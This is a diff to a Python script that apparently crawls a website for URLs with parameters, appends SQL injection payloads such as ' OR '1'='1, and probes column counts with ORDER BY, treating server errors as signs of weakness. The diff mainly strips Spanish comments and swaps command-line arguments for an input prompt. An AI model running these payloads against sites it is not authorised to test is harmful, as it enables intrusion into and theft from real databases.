@@ -73,7 +73,6 @@ def find_urls_to_test(url, base_url):
 
 # perform the sql injection
 def exploit_sqli(url):
-    # Test common SQLi payloads (only once)
     payloads = [
         "' OR '1'='1",
         "' OR '1'='1' --",
@@ -91,10 +90,10 @@ def exploit_sqli(url):
         target_url = url + payload
         r = requests.get(target_url, verify=False, proxies=proxies)
         if "Internal Server Error" in r.text:
-            print(f"[+] Vulnerable URL found with payload {payload}: {url}")
-            return True  # Indica que se encontró una vulnerabilidad
+            print(f"[+] Vulnerable URL found with payload {payload}")
+            return True
 
-    return False  # No se encontró ninguna vulnerabilidad
+    return False
 
 # function that detects column numbers
 def exploit_sqli_column_number(url):
@@ -102,17 +101,13 @@ def exploit_sqli_column_number(url):
         target_url = url + "'+order+by+%s--" % i
         r = requests.get(target_url, verify=False, proxies=proxies)
         if "Internal Server Error" in r.text:
-            return i - 1  # Devuelve el número de columnas
-    return False  # No se encontró ninguna vulnerabilidad
+            return i - 1 
+    return False
 
 if __name__ == "__main__":
-    try:
-        base_url = sys.argv[1].strip()
-        base_url = base_url.rstrip('/')
-    except IndexError:
-        print("[-] Usage: %s <base_url>" % sys.argv[0])
-        print("[-] Example: %s www.example.com" % sys.argv[0])
-        sys.exit(-1)
+    
+    base_url = input("Ingrese la URL que quiere escanear: ").strip()
+    base_url = base_url.rstrip('/')
 
     print("[+] Crawling the website to find URLs with parameters...")
     urls_to_test = find_urls_to_test(base_url, base_url)
